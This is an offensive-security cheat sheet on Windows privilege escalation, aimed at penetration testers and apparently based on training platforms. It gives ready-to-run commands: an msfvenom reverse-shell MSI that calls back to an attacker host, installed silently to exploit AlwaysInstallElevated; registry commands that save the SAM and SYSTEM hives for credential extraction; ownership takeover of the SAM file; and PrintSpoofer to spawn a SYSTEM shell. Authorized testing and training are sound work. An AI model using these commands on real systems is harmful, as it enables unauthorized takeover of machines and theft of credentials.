# Windows Privilege Escalation

Privilege Escalation in Windows occurs when a user gains higher privileges than initially assigned, often moving from a standard user to Administrator or SYSTEM.

This document contains common techniques used during Windows privilege escalation in penetration testing and red team engagements.

---

# Initial Enumeration

The first step after gaining access to a Windows machine is gathering information about the system.

### Basic System Information

```powershell
systeminfo
whoami
whoami /priv
whoami /groups
hostname
```
Network Information
```
ipconfig /all
netstat -ano
route print
arp -a
```
Users and Groups
```
net users
net localgroup
net localgroup administrators
```
AlwaysInstallElevated

If both registry keys are enabled, MSI packages can be installed with SYSTEM privileges.

Check the registry keys
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
If both show:
```
AlwaysInstallElevated    REG_DWORD    0x1
```
Then the system is vulnerable.

Exploitation

Generate a malicious MSI:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi -o shell.msi
```
Runt it
```
msiexec /quiet /qn /i shell.msi
```
Scheduled Tasks

Misconfigured scheduled tasks may allow privilege escalation.

Check tasks
```
schtasks /query /fo LIST /v
```
Look for tasks executed as SYSTEM with writable paths.

SeBackupPrivilege & SeRestorePrivilege

These privileges allow reading sensitive files like the SAM and SYSTEM registry hives.

Check privileges
```
whoami /priv
```
Dump the SAM and SYSTEM files
```
reg save hklm\sam sam
reg save hklm\system system
```
SeTakeOwnershipPrivilege

Allows taking ownership of files or registry keys.

Example
```
takeown /f C:\Windows\System32\config\SAM
```
SeImpersonatePrivilege (Potato Attacks)

One of the most common privilege escalation vectors.

If the user has:
```
SeImpersonatePrivilege
```
It may be possible to escalate privileges using tools like:

PrintSpoofer
JuicyPotato
RoguePotato

Example with PrintSpoofer
```
PrintSpoofer.exe -i -c cmd
```
This may spawn a SYSTEM shell.

Weak Service Permissions

Services running as SYSTEM but with writable configurations can be abused.

Enumerate services
```
sc query
wmic service list brief
```
Check service configuration
```
sc qc <service-name>
```
If the binary path is writable, it can be replaced with a malicious executable.

Useful Tools

Common tools used for Windows privilege escalation:

WinPEAS
Seatbelt
PowerUp
Sherlock
Watson

Example:
```
winPEAS.exe
```
These tools automate the discovery of privilege escalation opportunities.

References

TryHackMe
HackTheBox
Practical Ethical Hacking (TCM Security)
Windows Privilege Escalation resources
